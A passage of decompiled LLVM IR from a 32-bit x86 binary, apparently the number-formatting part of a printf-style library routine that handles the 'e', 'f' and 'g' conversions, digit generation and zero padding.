  %v3_80616bf = load i32, i32* %v2_80616bf, align 4
  store i32 %v3_80616bf, i32* %eax.global-to-local, align 4
  %v1_80616c6 = add i32 %tmp112, 8
  %v2_80616c6 = inttoptr i32 %v1_80616c6 to i8*
  %v3_80616c6 = load i8, i8* %v2_80616c6, align 1
  %v4_80616c6 = zext i8 %v3_80616c6 to i32
  %v5_80616c6 = load i32, i32* @ecx, align 4
  %v6_80616c6 = and i32 %v5_80616c6, -256
  %v7_80616c6 = or i32 %v6_80616c6, %v4_80616c6
  store i32 %v7_80616c6, i32* %ecx.global-to-local, align 4
  %v1_80616c9 = inttoptr i32 %tmp112 to i32*
  %v2_80616c9 = load i32, i32* %v1_80616c9, align 4
  store i32 %v2_80616c9, i32* %ebp.global-to-local, align 4
  %v3_80616cb = and i32 %v3_80616bf, -256
  %v4_80616cb = or i32 %v3_80616cb, %v4_80616c6
  %v1_80616d1 = or i32 %v4_80616cb, 32
  %v3_80616d1 = trunc i32 %v1_80616d1 to i8
  store i32 %v1_80616d1, i32* %eax.global-to-local, align 4
  %v10_80616dc = icmp eq i8 %v3_80616d1, 97
  %v1_80616de = icmp eq i1 %v10_80616dc, false
  br i1 %v1_80616de, label %dec_label_pc_80616e7, label %dec_label_pc_80616e0

dec_label_pc_80616e0:                             ; preds = %entry
  %v1_80616e0 = add i32 %v7_80616c6, 6
  %v11_80616e0 = trunc i32 %v1_80616e0 to i8
  store i32 %v1_80616e0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80616e7

dec_label_pc_80616e7:                             ; preds = %entry, %dec_label_pc_80616e0
  %stack_var_-206.0 = phi i8 [ %v3_80616c6, %entry ], [ %v11_80616e0, %dec_label_pc_80616e0 ]
  %v2_80616e7 = icmp slt i32 %v2_80616c9, 0
  %v1_80616e9 = icmp eq i1 %v2_80616e7, false
  br i1 %v1_80616e9, label %dec_label_pc_80616f0, label %dec_label_pc_80616eb

dec_label_pc_80616eb:                             ; preds = %dec_label_pc_80616e7
  store i32 6, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80616f0

dec_label_pc_80616f0:                             ; preds = %dec_label_pc_80616e7, %dec_label_pc_80616eb
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80616ff = add i32 %tmp112, 12
  %v2_80616ff = inttoptr i32 %v1_80616ff to i32*
  %v3_80616ff = load i32, i32* %v2_80616ff, align 4
  store i32 %v3_80616ff, i32* %eax.global-to-local, align 4
  %v2_8061702 = and i32 %v3_80616ff, 2
  %v3_8061702 = icmp eq i32 %v2_8061702, 0
  br i1 %v3_8061702, label %dec_label_pc_8061710, label %dec_label_pc_806171c

dec_label_pc_8061710:                             ; preds = %dec_label_pc_80616f0
  %v2_8061710 = urem i32 %v3_80616ff, 2
  %tmp143 = trunc i32 %v2_8061710 to i8
  %tmp = sub nsw i8 0, %tmp143
  %tmp144 = and i8 %tmp, 32
  br label %dec_label_pc_806171c

dec_label_pc_806171c:                             ; preds = %dec_label_pc_8061710, %dec_label_pc_80616f0
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80616f0 ], [ %tmp144, %dec_label_pc_8061710 ]
  %v1_8061730 = udiv i32 %v3_80616ff, 256
  %tmp145 = and i32 %v1_8061730, 68
  %tmp146 = icmp eq i32 %tmp145, 64
  br i1 %tmp146, label %dec_label_pc_8061882, label %dec_label_pc_80617a2

dec_label_pc_80617a2:                             ; preds = %dec_label_pc_806171c
  store i3 %v4_80616b8, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp112, i32* %edx.global-to-local, align 4
  %v1_80617a9 = add i32 %tmp112, 16
  %v2_80617a9 = inttoptr i32 %v1_80617a9 to i32*
  store i32 32, i32* %v2_80617a9, align 4
  store i32 3, i32* %stack_var_-152, align 4
  %v4_80617c0 = add i8 %stack_var_-206.0, -96
  %v6_80617c0 = sub i8 95, %stack_var_-206.0
  %v7_80617c0 = and i8 %v6_80617c0, %stack_var_-206.0
  %v8_80617c0 = icmp slt i8 %v7_80617c0, 0
  %v9_80617c0 = icmp eq i8 %v4_80617c0, 0
  %v10_80617c0 = icmp slt i8 %v4_80617c0, 0
  %v3_80617c5 = icmp eq i1 %v10_80617c0, %v8_80617c0
  %v4_80617c5 = icmp eq i1 %v9_80617c0, false
  %v5_80617c5 = and i1 %v4_80617c5, %v3_80617c5
  br i1 %v5_80617c5, label %dec_label_pc_80617cc, label %dec_label_pc_80617c7

dec_label_pc_80617c7:                             ; preds = %dec_label_pc_80617a2
  br label %dec_label_pc_80617cc

dec_label_pc_80617cc:                             ; preds = %dec_label_pc_80617a2, %dec_label_pc_80617c7
  %v2_80617d4 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80617d4, i32* @ecx, align 4
  br label %dec_label_pc_8061ba7

dec_label_pc_8061882:                             ; preds = %dec_label_pc_806171c
  %v1_8061741 = add i3 %v4_80616b8, -2
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v6_8061886 = and i32 %v3_80616ff, -65536
  %v2_806188b = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_806188b, i32* %edx.global-to-local, align 4
  %v1_8061892 = udiv i16 %tmp103, 256
  %v2_8061892 = zext i16 %v1_8061892 to i32
  %v3_8061892 = mul nuw nsw i32 %v2_8061892, 256
  %tmp147 = urem i16 %tmp103, 256
  %v4_8061886.masked = zext i16 %tmp147 to i32
  %v11_8061892 = or i32 %v4_8061886.masked, %v3_8061892
  %v10_8061892 = or i32 %v11_8061892, %v6_8061886
  %v12_8061892 = or i32 %v10_8061892, 3072
  store i32 %v12_8061892, i32* %eax.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8061741, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80618a6

dec_label_pc_80618a6:                             ; preds = %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge, %dec_label_pc_8061882
  %v2_80618c3 = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8061882 ], [ %v2_80618c3.pre, %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge ]
  %v1_80618a6 = phi i3 [ %v1_8061741, %dec_label_pc_8061882 ], [ %v1_80618a6.pre, %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge ]
  %v3_80618cd = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8061882 ], [ %v0_80618a6.pre, %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_806188b, %dec_label_pc_8061882 ], [ %v4_80618c8, %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp148 = fptosi x86_fp80 %v3_80618cd to i32
  store i32 %tmp148, i32* %eax.global-to-local, align 4
  store i32 %tmp148, i32* %ebx.global-to-local, align 4
  %v5_80618c0 = sitofp i32 %tmp148 to x86_fp80
  %v4_80618c3 = fsub x86_fp80 %v2_80618c3, %v5_80618c0
  store i3 %v1_80618a6, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80618c8 = add i32 %stack_var_-212.0, 9
  %v4_80618cd = fmul x86_fp80 %v3_80618cd, %v4_80618c3
  store x86_fp80 %v4_80618cd, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80618cf

dec_label_pc_80618cf:                             ; preds = %dec_label_pc_80618cf.dec_label_pc_80618cf_crit_edge, %dec_label_pc_80618a6
  %v0_80618e1 = phi i32 [ %v0_80618e1.pre, %dec_label_pc_80618cf.dec_label_pc_80618cf_crit_edge ], [ %tmp148, %dec_label_pc_80618a6 ]
  %v0_80618cf = phi i32 [ %v0_80618cf.pre, %dec_label_pc_80618cf.dec_label_pc_80618cf_crit_edge ], [ 0, %dec_label_pc_80618a6 ]
  %v1_80618cf = add i32 %v0_80618cf, 1
  store i32 %v1_80618cf, i32* %esi.global-to-local, align 4
  %v2_80618d4 = sub i32 %v4_80618c8, %v1_80618cf
  store i32 10, i32* %ecx.global-to-local, align 4
  %div = udiv i32 %v0_80618e1, 10
  %tmp136 = urem i32 %v0_80618e1, 10
  store i32 %div, i32* %ebx.global-to-local, align 4
  store i32 %v2_80618d4, i32* %eax.global-to-local, align 4
  %v1_80618ed = or i32 %tmp136, 48
  %v8_80618ed = trunc i32 %v1_80618ed to i8
  store i32 %v1_80618ed, i32* %edx.global-to-local, align 4
  %v3_80618f3 = inttoptr i32 %v2_80618d4 to i8*
  store i8 %v8_80618ed, i8* %v3_80618f3, align 1
  %v7_80618f5 = icmp sgt i32 %v1_80618cf, 8
  br i1 %v7_80618f5, label %dec_label_pc_80618f7, label %dec_label_pc_80618cf.dec_label_pc_80618cf_crit_edge

dec_label_pc_80618cf.dec_label_pc_80618cf_crit_edge: ; preds = %dec_label_pc_80618cf
  %v0_80618cf.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80618e1.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80618cf

dec_label_pc_80618f7:                             ; preds = %dec_label_pc_80618cf
  %v0_80618f7 = load i32, i32* @edi, align 4
  %v1_80618f7 = add i32 %v0_80618f7, 1
  store i32 %v1_80618f7, i32* @edi, align 4
  %v7_80618fb = icmp sgt i32 %v1_80618f7, 2
  br i1 %v7_80618fb, label %dec_label_pc_80618fd, label %dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge

dec_label_pc_80618f7.dec_label_pc_80618a6_crit_edge: ; preds = %dec_label_pc_80618f7
  %v0_80618a6.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_80618a6.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80618c3.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80618a6

dec_label_pc_80618fd:                             ; preds = %dec_label_pc_80618f7
  %v0_80618fd = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80618fd = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80618fd, x86_fp80* %st0.global-to-local, align 4
  %v2_80618ff = add i3 %v0_80618fd, 2
  store i3 %v2_80618ff, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8061901 = add i8 %stack_var_-206.0, -96
  %v6_8061901 = sub i8 95, %stack_var_-206.0
  %v7_8061901 = and i8 %v6_8061901, %stack_var_-206.0
  %v8_8061901 = icmp slt i8 %v7_8061901, 0
  %v9_8061901 = icmp eq i8 %v4_8061901, 0
  %v10_8061901 = icmp slt i8 %v4_8061901, 0
  %v3_8061906 = icmp eq i1 %v10_8061901, %v8_8061901
  %v4_8061906 = icmp eq i1 %v9_8061901, false
  %v5_8061906 = and i1 %v4_8061906, %v3_8061906
  br i1 %v5_8061906, label %dec_label_pc_8061915, label %dec_label_pc_8061908

dec_label_pc_8061908:                             ; preds = %dec_label_pc_80618fd
  %v4_8061908 = add i8 %stack_var_-206.0, 32
  br label %dec_label_pc_8061915

dec_label_pc_8061915:                             ; preds = %dec_label_pc_80618fd, %dec_label_pc_8061908
  %stack_var_-206.1 = phi i8 [ %stack_var_-206.0, %dec_label_pc_80618fd ], [ %v4_8061908, %dec_label_pc_8061908 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80618fd ], [ 69, %dec_label_pc_8061908 ]
  %v12_8061915 = icmp eq i8 %stack_var_-206.1, 103
  %v1_806191a = icmp eq i1 %v12_8061915, false
  br i1 %v1_806191a, label %dec_label_pc_8061923, label %dec_label_pc_806191c

dec_label_pc_806191c:                             ; preds = %dec_label_pc_8061915
  %v0_806191c = load i32, i32* %ebp.global-to-local, align 4
  %tmp137 = icmp slt i32 %v0_806191c, 1
  br i1 %tmp137, label %dec_label_pc_806192a, label %dec_label_pc_8061920

dec_label_pc_8061920:                             ; preds = %dec_label_pc_806191c
  %v1_8061920 = add i32 %v0_806191c, -1
  store i32 %v1_8061920, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_806192a

dec_label_pc_8061923:                             ; preds = %dec_label_pc_8061915
  %v12_8061923 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v12_8061923, label %dec_label_pc_806192e, label %dec_label_pc_8061923.dec_label_pc_806192a_crit_edge

dec_label_pc_8061923.dec_label_pc_806192a_crit_edge: ; preds = %dec_label_pc_8061923
  %v0_806192a.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_806192a

dec_label_pc_806192a:                             ; preds = %dec_label_pc_8061923.dec_label_pc_806192a_crit_edge, %dec_label_pc_806191c, %dec_label_pc_8061920
  %v0_806192a = phi i32 [ %v0_806192a.pre, %dec_label_pc_8061923.dec_label_pc_806192a_crit_edge ], [ %v0_806191c, %dec_label_pc_806191c ], [ %v1_8061920, %dec_label_pc_8061920 ]
  store i32 %v0_806192a, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806195b

dec_label_pc_806192e:                             ; preds = %dec_label_pc_8061923
  store i32 -1, i32* %edx.global-to-local, align 4
  %v0_8061932 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8061932 = add i32 %v0_8061932, -1
  store i32 %v2_8061932, i32* %ebx.global-to-local, align 4
  %v5_8061939 = icmp slt i32 %v2_8061932, -1
  br i1 %v5_8061939, label %dec_label_pc_806193b, label %dec_label_pc_806195b

dec_label_pc_806193b:                             ; preds = %dec_label_pc_806192e
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8061943 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_8061943, i32* %eax.global-to-local, align 4
  %v4_806194b = bitcast i32* %stack_var_-72 to i8*
  %v5_806194b = call i32 @__GI_memset(i8* %v4_806194b, i32 48, i32 21)
  store i32 %v5_806194b, i32* %eax.global-to-local, align 4
  %v0_806196b.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_806195b

dec_label_pc_806195b:                             ; preds = %dec_label_pc_806192e, %dec_label_pc_806193b, %dec_label_pc_806192a
  %v1_806197b = phi i32 [ %v0_806192a, %dec_label_pc_806192a ], [ %v0_806196b.pr.pre, %dec_label_pc_806193b ], [ %v2_8061932, %dec_label_pc_806192e ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_806196e = icmp sgt i32 %v1_806197b, 20
  br i1 %v7_806196e, label %dec_label_pc_8061970, label %dec_label_pc_806197b

dec_label_pc_8061970:                             ; preds = %dec_label_pc_806195b
  %v2_8061970 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8061970, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806198f.preheader

dec_label_pc_806197b:                             ; preds = %dec_label_pc_806195b
  %v0_806197b = load i32, i32* @esp, align 4
  %v2_806197b = add i32 %v1_806197b, 165
  %v3_806197b = add i32 %v2_806197b, %v0_806197b
  store i32 %v3_806197b, i32* %eax.global-to-local, align 4
  %v1_8061982 = add i32 %v3_806197b, 2
  store i32 %v1_8061982, i32* %ecx.global-to-local, align 4
  %v2_8061985 = inttoptr i32 %v1_8061982 to i8*
  %v3_8061985 = load i8, i8* %v2_8061985, align 1
  %v4_8061985 = add i8 %v3_8061985, -53
  %v9_8061985 = sub i8 52, %v3_8061985
  %v10_8061985 = and i8 %v9_8061985, %v3_8061985
  %v11_8061985 = icmp slt i8 %v10_8061985, 0
  %v13_8061985 = icmp slt i8 %v4_8061985, 0
  %v2_8061989 = icmp eq i1 %v13_8061985, %v11_8061985
  %v3_8061989 = zext i1 %v2_8061989 to i32
  br label %dec_label_pc_806198f.preheader

dec_label_pc_806198f.preheader:                   ; preds = %dec_label_pc_806197b, %dec_label_pc_8061970
  %v0_806198f63 = phi i32 [ %v1_8061982, %dec_label_pc_806197b ], [ %v2_8061970, %dec_label_pc_8061970 ]
  %storemerge52 = phi i32 [ %v3_8061989, %dec_label_pc_806197b ], [ 0, %dec_label_pc_8061970 ]
  store i32 %storemerge52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806198f

dec_label_pc_806198f:                             ; preds = %dec_label_pc_806198f.backedge, %dec_label_pc_806198f.preheader
  %v3_8061990 = phi i32 [ %v3_8061990.pre, %dec_label_pc_806198f.backedge ], [ %storemerge52, %dec_label_pc_806198f.preheader ]
  %v0_806198f = phi i32 [ %v0_8061992, %dec_label_pc_806198f.backedge ], [ %v0_806198f63, %dec_label_pc_806198f.preheader ]
  %v1_806198f = add i32 %v0_806198f, -1
  store i32 %v1_806198f, i32* %ecx.global-to-local, align 4
  %v1_8061990 = inttoptr i32 %v1_806198f to i8*
  %v2_8061990 = load i8, i8* %v1_8061990, align 1
  %v4_8061990 = trunc i32 %v3_8061990 to i8
  %v5_8061990 = add i8 %v2_8061990, %v4_8061990
  store i8 %v5_8061990, i8* %v1_8061990, align 1
  %v0_8061992 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8061992 = inttoptr i32 %v0_8061992 to i8*
  %v2_8061992 = load i8, i8* %v1_8061992, align 1
  %v3_8061992 = zext i8 %v2_8061992 to i32
  %v4_8061992 = load i32, i32* %edx.global-to-local, align 4
  %v5_8061992 = and i32 %v4_8061992, -256
  %v6_8061992 = or i32 %v5_8061992, %v3_8061992
  store i32 %v6_8061992, i32* %edx.global-to-local, align 4
  %v7_8061994 = icmp eq i8 %v2_8061992, 48
  br i1 %v7_8061994, label %dec_label_pc_806198f.backedge, label %dec_label_pc_8061999

dec_label_pc_806198f.backedge:                    ; preds = %dec_label_pc_806198f, %dec_label_pc_8061999
  %v3_8061990.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806198f

dec_label_pc_8061999:                             ; preds = %dec_label_pc_806198f
  %v2_8061999 = add i8 %v2_8061992, -57
  %v7_8061999 = sub i8 56, %v2_8061992
  %v8_8061999 = and i8 %v7_8061999, %v2_8061992
  %v9_8061999 = icmp slt i8 %v8_8061999, 0
  %v10_8061999 = icmp eq i8 %v2_8061999, 0
  %v11_8061999 = icmp slt i8 %v2_8061999, 0
  %v3_806199c = icmp eq i1 %v11_8061999, %v9_8061999
  %v4_806199c = icmp eq i1 %v10_8061999, false
  %v5_806199c = and i1 %v4_806199c, %v3_806199c
  br i1 %v5_806199c, label %dec_label_pc_806198f.backedge, label %dec_label_pc_806199e

dec_label_pc_806199e:                             ; preds = %dec_label_pc_8061999
  %v2_806199e = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_806199e, i32* %eax.global-to-local, align 4
  %tmp149 = icmp ugt i32 %v0_8061992, %v2_806199e
  store i32 -1, i32* %esi.global-to-local, align 4
  br i1 %tmp149, label %dec_label_pc_80619a9, label %dec_label_pc_80619b6

dec_label_pc_80619a9:                             ; preds = %dec_label_pc_806199e
  store i32 %v2_806188b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80619bf

dec_label_pc_80619b6:                             ; preds = %dec_label_pc_806199e
  store i32 %v2_806199e, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %v2_806199e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80619bf

dec_label_pc_80619bf:                             ; preds = %dec_label_pc_80619a9, %dec_label_pc_80619b6
  %v0_80619bf = phi i32 [ %v0_8061992, %dec_label_pc_80619a9 ], [ %v2_806199e, %dec_label_pc_80619b6 ]
  %v1_80619bf = add i32 %v0_80619bf, 1
  store i32 %v1_80619bf, i32* %eax.global-to-local, align 4
  %v2_80619c6 = inttoptr i32 %v1_80619bf to i8*
  store i8 0, i8* %v2_80619c6, align 1
  br i1 %v1_806191a, label %dec_label_pc_80619ec, label %dec_label_pc_80619d1

dec_label_pc_80619d1:                             ; preds = %dec_label_pc_80619bf
  %v0_80619d1 = load i32, i32* %esi.global-to-local, align 4
  %v5_80619d4 = icmp slt i32 %v0_80619d1, -4
  br i1 %v5_80619d4, label %dec_label_pc_80619f9, label %dec_label_pc_80619d6

dec_label_pc_80619d6:                             ; preds = %dec_label_pc_80619d1
  %v1_80619d6 = load i32, i32* %ebx.global-to-local, align 4
  %v7_80619d8 = icmp slt i32 %v1_80619d6, %v0_80619d1
  br i1 %v7_80619d8, label %dec_label_pc_80619f9, label %dec_label_pc_80619e1

dec_label_pc_80619e1:                             ; preds = %dec_label_pc_80619d6
  %v2_80619e8 = sub i32 %v1_80619d6, %v0_80619d1
  store i32 %v2_80619e8, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80619fd

dec_label_pc_80619ec:                             ; preds = %dec_label_pc_80619bf
  %v4_80619ec = zext i8 %stack_var_-206.1 to i32
  %v5_80619ec = load i32, i32* %ecx.global-to-local, align 4
  %v6_80619ec = and i32 %v5_80619ec, -256
  %v7_80619ec = or i32 %v6_80619ec, %v4_80619ec
  store i32 %v7_80619ec, i32* %ecx.global-to-local, align 4
  %v10_80619f4 = icmp eq i8 %stack_var_-206.1, 102
  br i1 %v10_80619f4, label %dec_label_pc_80619ec.dec_label_pc_80619fd_crit_edge, label %dec_label_pc_80619f9

dec_label_pc_80619ec.dec_label_pc_80619fd_crit_edge: ; preds = %dec_label_pc_80619ec
  %v0_80619fd.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80619fd

dec_label_pc_80619f9:                             ; preds = %dec_label_pc_80619d1, %dec_label_pc_80619d6, %dec_label_pc_80619ec
  %stack_var_-197.0 = phi i8 [ %stack_var_-206.1, %dec_label_pc_80619ec ], [ 103, %dec_label_pc_80619d6 ], [ 103, %dec_label_pc_80619d1 ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061a07

dec_label_pc_80619fd:                             ; preds = %dec_label_pc_80619ec.dec_label_pc_80619fd_crit_edge, %dec_label_pc_80619e1
  %v0_80619fd = phi i32 [ %v0_80619fd.pre, %dec_label_pc_80619ec.dec_label_pc_80619fd_crit_edge ], [ %v0_80619d1, %dec_label_pc_80619e1 ]
  store i32 %v0_80619fd, i32* %ebx.global-to-local, align 4
  %v2_80619ff = icmp slt i32 %v0_80619fd, 0
  %v1_8061a01 = icmp eq i1 %v2_80619ff, false
  br i1 %v1_8061a01, label %dec_label_pc_8061a07, label %dec_label_pc_8061a03

dec_label_pc_8061a03:                             ; preds = %dec_label_pc_80619fd
  %v0_8061a03 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061a03 = add i32 %v0_8061a03, -1
  store i32 %v1_8061a03, i32* %edx.global-to-local, align 4
  %v1_8061a04 = inttoptr i32 %v1_8061a03 to i8*
  store i8 48, i8* %v1_8061a04, align 1
  %v0_8061a3c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061a07

dec_label_pc_8061a07:                             ; preds = %dec_label_pc_80619fd, %dec_label_pc_80619f9, %dec_label_pc_8061a03
  %v1_8061a97 = phi i32 [ %v0_80619fd, %dec_label_pc_80619fd ], [ %v0_8061a3c.pre, %dec_label_pc_8061a03 ], [ 0, %dec_label_pc_80619f9 ]
  %stack_var_-197.2 = phi i8 [ 102, %dec_label_pc_80619fd ], [ 102, %dec_label_pc_8061a03 ], [ %stack_var_-197.0, %dec_label_pc_80619f9 ]
  %v2_8061a07 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_8061a07, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v0_8061a22 = load i32, i32* %edx.global-to-local, align 4
  %v1_8061a22 = inttoptr i32 %v0_8061a22 to i8*
  %v2_8061a22 = load i8, i8* %v1_8061a22, align 1
  %v3_8061a22 = zext i8 %v2_8061a22 to i32
  %v5_8061a22 = and i32 %v2_8061a07, -256
  %v6_8061a22 = or i32 %v3_8061a22, %v5_8061a22
  store i32 %v6_8061a22, i32* %eax.global-to-local, align 4
  %v1_8061a24 = add i32 %v0_8061a22, 1
  store i32 %v1_8061a24, i32* %edi.global-to-local, align 4
  store i32 %v6_8061a22, i32* %stack_var_-22, align 4
  %v2_8061a32 = sub i32 %v1_80619bf, %v1_8061a24
  store i32 %v2_8061a32, i32* %edx.global-to-local, align 4
  %v1_8061a3c = icmp eq i32 %v1_8061a97, 0
  %v2_8061a3c = icmp slt i32 %v1_8061a97, 0
  br i1 %v2_8061a3c, label %dec_label_pc_8061a8b, label %dec_label_pc_8061a40

dec_label_pc_8061a40:                             ; preds = %dec_label_pc_8061a07
  store i32 112, i32* %stack_var_-144, align 4
  %v2_8061a4c = sub i32 %v1_8061a97, %v2_8061a32
  %v8_8061a4c = xor i32 %v2_8061a32, %v1_8061a97
  %v9_8061a4c = xor i32 %v2_8061a4c, %v1_8061a97
  %v10_8061a4c = and i32 %v9_8061a4c, %v8_8061a4c
  %v11_8061a4c = icmp slt i32 %v10_8061a4c, 0
  %v13_8061a4c = icmp slt i32 %v2_8061a4c, 0
  %v2_8061a4e = icmp eq i1 %v13_8061a4c, %v11_8061a4c
  br i1 %v2_8061a4e, label %dec_label_pc_8061a50, label %dec_label_pc_8061a84

dec_label_pc_8061a50:                             ; preds = %dec_label_pc_8061a40
  store i32 %v2_8061a4c, i32* %eax.global-to-local, align 4
  %tmp138 = icmp slt i32 %v2_8061a4c, 1
  %tmp139 = icmp eq i1 %tmp138, false
  br i1 %tmp139, label %dec_label_pc_8061a65, label %dec_label_pc_8061a80

dec_label_pc_8061a65:                             ; preds = %dec_label_pc_8061a50
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_8061a80

dec_label_pc_8061a80:                             ; preds = %dec_label_pc_8061a50, %dec_label_pc_8061a65
  %storemerge10.in = phi i32* [ %stack_var_-120, %dec_label_pc_8061a65 ], [ %stack_var_-132, %dec_label_pc_8061a50 ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge10 = ptrtoint i32* %storemerge10.in to i32
  store i32 %storemerge10, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8061aa0

dec_label_pc_8061a84:                             ; preds = %dec_label_pc_8061a40
  %v4_8061a86 = icmp eq i1 %v1_8061a3c, false
  br i1 %v4_8061a86, label %dec_label_pc_8061a91, label %dec_label_pc_8061a88

dec_label_pc_8061a88:                             ; preds = %dec_label_pc_8061a84
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061a8b

dec_label_pc_8061a8b:                             ; preds = %dec_label_pc_8061a07, %dec_label_pc_8061a88
  %v0_8061ad373 = phi i32 [ %v1_8061a97, %dec_label_pc_8061a07 ], [ -1, %dec_label_pc_8061a88 ]
  %v2_8061a8b = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8061a8b, i32* @ecx, align 4
  br label %dec_label_pc_8061aa0

dec_label_pc_8061a91:                             ; preds = %dec_label_pc_8061a84
  %v2_8061a95 = add i32 %v1_8061a24, %v1_8061a97
  store i32 %v2_8061a95, i32* %edi.global-to-local, align 4
  %v2_8061a97 = sub i32 %v2_8061a32, %v1_8061a97
  store i32 %v2_8061a97, i32* %edx.global-to-local, align 4
  %v2_8061a99 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8061a99, i32* @ecx, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8061aa0

dec_label_pc_8061aa0:                             ; preds = %dec_label_pc_8061a8b, %dec_label_pc_8061a80, %dec_label_pc_8061a91
  %v0_8061ad372 = phi i32 [ %v0_8061ad373, %dec_label_pc_8061a8b ], [ -1, %dec_label_pc_8061a80 ], [ -1, %dec_label_pc_8061a91 ]
  %v0_8061abc = phi i32 [ %v2_8061a8b, %dec_label_pc_8061a8b ], [ %storemerge10, %dec_label_pc_8061a80 ], [ %v2_8061a99, %dec_label_pc_8061a91 ]
  %v0_8061aad = phi i32 [ %v2_8061a32, %dec_label_pc_8061a8b ], [ 0, %dec_label_pc_8061a80 ], [ %v2_8061a97, %dec_label_pc_8061a91 ]
  store i32 %tmp112, i32* %eax.global-to-local, align 4
  %v2_8061aa7 = inttoptr i32 %v1_80616ff to i8*
  %v3_8061aa7 = load i8, i8* %v2_8061aa7, align 1
  %v4_8061aa7 = and i8 %v3_8061aa7, 16
  %v5_8061aa7 = icmp eq i8 %v4_8061aa7, 0
  %v1_8061aab = icmp eq i1 %v5_8061aa7, false
  br i1 %v1_8061aab, label %dec_label_pc_8061abc, label %dec_label_pc_8061aad

dec_label_pc_8061aad:                             ; preds = %dec_label_pc_8061aa0
  %v1_8061aad = icmp eq i32 %v0_8061aad, 0
  %v1_8061aaf = icmp eq i1 %v1_8061aad, false
  br i1 %v1_8061aaf, label %dec_label_pc_8061abc, label %dec_label_pc_8061ab1

dec_label_pc_8061ab1:                             ; preds = %dec_label_pc_8061aad
  br i1 %v12_8061915, label %dec_label_pc_8061ad3, label %dec_label_pc_8061ab8

dec_label_pc_8061ab8:                             ; preds = %dec_label_pc_8061ab1
  %v0_8061ab8 = load i32, i32* %ebp.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_8061ab8, 1
  br i1 %tmp140, label %dec_label_pc_8061ad3, label %dec_label_pc_8061abc

dec_label_pc_8061abc:                             ; preds = %dec_label_pc_8061ab8, %dec_label_pc_8061aad, %dec_label_pc_8061aa0
  %v1_8061abc = inttoptr i32 %v0_8061abc to i32*
  store i32 112, i32* %v1_8061abc, align 4
  %v0_8061ac2 = load i32, i32* @ecx, align 4
  %v1_8061ac2 = add i32 %v0_8061ac2, 4
  %v2_8061ac2 = inttoptr i32 %v1_8061ac2 to i32*
  store i32 1, i32* %v2_8061ac2, align 4
  %v0_8061ac9 = load i32, i32* @ecx, align 4
  %v1_8061ac9 = add i32 %v0_8061ac9, 8
